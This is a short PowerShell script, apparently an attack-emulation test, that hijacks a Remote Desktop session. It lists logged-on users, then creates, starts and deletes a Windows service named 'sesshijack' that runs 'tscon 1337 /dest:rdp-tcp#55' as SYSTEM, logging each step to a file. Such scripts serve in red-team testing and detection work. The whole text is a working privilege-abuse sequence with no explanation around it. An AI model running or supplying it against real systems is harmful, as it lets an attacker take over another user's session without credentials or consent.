'*******************************************************************************'| Out-File -FilePath $args[0]
cmd.exe /c 'query user' |  Out-File -FilePath $args[0] -Append
cmd.exe /c 'sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"' |  Out-File -FilePath $args[0] -Append
cmd.exe /c 'net start sesshijack' |  Out-File -FilePath $args[0] -Append
cmd.exe /c 'Timeout / t 5' |  Out-File -FilePath $args[0] -Append
cmd.exe /c 'sc.exe delete sesshijack >nul 2>&1' |  Out-File -FilePath $args[0] -Append
